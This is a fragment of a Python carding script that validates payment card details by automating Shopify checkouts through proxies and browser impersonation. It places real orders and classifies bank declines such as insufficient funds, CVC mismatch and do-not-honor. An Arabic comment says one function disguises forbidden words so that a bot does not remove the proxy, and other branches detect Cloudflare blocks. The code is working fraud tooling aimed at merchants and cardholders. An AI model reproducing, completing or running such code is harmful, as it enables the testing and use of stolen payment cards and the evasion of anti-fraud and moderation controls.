...
def safe_return(msg, price, gate):
    # هذه الدالة تقوم بتشفير الكلمات الممنوعة لكي لا يغضب البوت ويحذف البروكسي
...
async def check_shopify(cc_info, store_url, proxy):
    try:
        ...
        if len(cc_parts) < 4: return safe_return("Invalid CC Format", "-", "Shopify API")
        ...
        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
            ...
            if not variant_id:
                return safe_return("No active products found", "-", "Shopify API")
            ...
            if not auth_token:
                if "Just a moment" in html2 or "cloudflare" in html2.lower():
                    return safe_return("Cloudflare Challenge Blocked IP", f"${price}", "Shopify API")
                return safe_return("Token Not Found (Protected)", f"${price}", "Shopify API")
            ...
            if res5.status_code != 200: 
                return safe_return("Failed to tokenize card (IP Banned by Stripe)", f"${price}", "Shopify API")
            ...
            if "thank you" in result_html or "order completed" in result_html or res6.url.endswith('/thank_you'):
                return safe_return("Order completed 💎", f"${price}", "Shopify API")
            elif "insufficient funds" in result_html: return safe_return("Insufficient Funds", f"${price}", "Shopify API")
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: return safe_return("Incorrect CVC", f"${price}", "Shopify API")
            elif "zip code does not match" in result_html or "avs" in result_html: return safe_return("ZIP Code Mismatch", f"${price}", "Shopify API")
            elif "do not honor" in result_html or "generic_decline" in result_html: return safe_return("Do Not Honor", f"${price}", "Shopify API")
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res6.text)
                if error_match: return safe_return(error_match.group(1).strip(), f"${price}", "Shopify API")
                return safe_return("Declined / Generic Error", f"${price}", "Shopify API")

    except Exception as e:
        return safe_return(f"Sys_Err: {str(e)[:40]}", "-", "Shopify API")
